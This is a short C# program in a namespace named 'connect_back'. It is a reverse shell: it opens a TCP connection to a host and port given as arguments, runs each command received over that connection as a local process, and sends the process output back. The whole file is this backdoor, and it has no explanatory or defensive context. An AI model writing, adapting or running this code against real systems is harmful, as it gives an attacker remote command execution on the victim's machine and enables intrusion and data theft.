using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Text;

namespace connect_back
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			Stream stream = new TcpClient (args [0], int.Parse (args [1])).GetStream ();
			using (StreamReader rdr = new StreamReader(stream)) {
				while (stream.CanRead) {
					string command = rdr.ReadLine();
					string fileName = command.Substring(0, command.IndexOf(' '));
					string arg = command.Substring(command.IndexOf(' '), command.Length - fileName.Length);

					Process prc = new Process();
					prc.StartInfo = new ProcessStartInfo();
					prc.StartInfo.FileName = fileName;
					prc.StartInfo.Arguments = arg;
					prc.StartInfo.UseShellExecute = false;
					prc.StartInfo.RedirectStandardOutput = true;
					prc.Start();
					prc.WaitForExit();
					 
					byte[] results = Encoding.ASCII.GetBytes(prc.StandardOutput.ReadToEnd());
					stream.Write(results, 0, results.Length);
				}
			}
		}
	}
}